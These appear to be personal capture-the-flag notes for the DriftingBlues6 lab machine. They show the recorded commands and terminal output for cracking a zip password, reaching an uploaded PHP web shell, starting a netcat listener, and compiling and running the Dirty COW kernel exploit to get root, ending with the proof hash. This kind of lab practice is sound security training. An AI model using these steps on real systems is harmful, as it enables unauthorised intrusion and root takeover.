参考资料：  
[https://cyberarri.com/2024/07/13/driftingblues6-redo-pg-play/](https://cyberarri.com/2024/07/13/driftingblues6-redo-pg-play/)
 
直接提权root  
[https://medium.com/@barrattjack89/pg-play-driftingblues6-walkt-ffb0f31cdc31](https://medium.com/@barrattjack89/pg-play-driftingblues6-walkt-ffb0f31cdc31)
    
[https://medium.com/@barrattjack89/pg-play-driftingblues6-walkt-ffb0f31cdc31](https://medium.com/@barrattjack89/pg-play-driftingblues6-walkt-ffb0f31cdc31)
      

内核提权使用https://www.exploit-db.com/exploits/40847  
root@driftingblues:~# uname -a  
uname -a  
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux  
root@driftingblues:~#
   

pojie  
john --wordlist=/opt/Tools/rockyou.txt spammer.zip  
┌──(kali㉿kali)-[~/Desktop/pg02/DriftingBlues6]  
└─$ cat creds.txt  
mayer:lionheart  
┌──(kali㉿kali)-[~/Desktop/pg02/DriftingBlues6]  
└─$ cat DriftingBlues6.txt  
[https://medium.com/@barrattjack89/pg-play-driftingblues6-walkt-ffb0f31cdc31](https://medium.com/@barrattjack89/pg-play-driftingblues6-walkt-ffb0f31cdc31)
  
find / "local.txt" 2\>/dev/null | grep "local.txt"  
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 
shell   [http://192.168.196.219//textpattern/files/shell.php](http://192.168.196.219//textpattern/files/shell.php)
 
nc -lvpn 1234  
 
tiquan  
www-data@driftingblues:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil  
\<$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil  
www-data@driftingblues:/tmp$ ls  
ls  
40847 (1).cpp 40847.cpp dcow vmware-root  
www-data@driftingblues:/tmp$ ./docw -s  
./docw -s  
bash: ./docw: No such file or directory  
www-data@driftingblues:/tmp$ chmod +x docw  
chmod +x docw  
chmod: cannot access `docw': No such file or directory  
www-data@driftingblues:/tmp$ ls  
ls  
40847 (1).cpp 40847.cpp dcow vmware-root  
www-data@driftingblues:/tmp$ ls -al  
ls -al  
total 84  
drwxrwxrwt 3 root root 4096 Nov 16 06:32 .  
drwxr-xr-x 23 root root 4096 Mar 17 2021 ..  
-rw-rw-rw- 1 www-data www-data 10531 Nov 16 06:20 40847 (1).cpp  
-rw-rw-rw- 1 www-data www-data 10531 Oct 24 04:19 40847.cpp  
-rwxrwxrwx 1 www-data www-data 48041 Nov 16 06:32 dcow  
drwx------ 2 root root 4096 Aug 2 2024 vmware-root  
www-data@driftingblues:/tmp$ chmod +x dcow  
chmod +x dcow  
www-data@driftingblues:/tmp$ ./dcow -s  
./dcow -s  
Running ...  
Password overridden to: dirtyCowFun
 
Received su prompt (Password: )
 
root@driftingblues:~# echo 0 \> /proc/sys/vm/dirty_writeback_centisecs  
root@driftingblues:~# cp /tmp/.ssh_bak /etc/passwd  
root@driftingblues:~# rm /tmp/.ssh_bak  
root@driftingblues:~# ./dcow  
./dcow  
-su: ./dcow: No such file or directory  
root@driftingblues:~# cd /root  
cd /root  
root@driftingblues:~# ls  
ls  
proof.txt  
root@driftingblues:~# cat proof.txt  
cat proof.txt  
76af04ea50b1b01dab1d5ad4ee45a9bd  
root@driftingblues:~#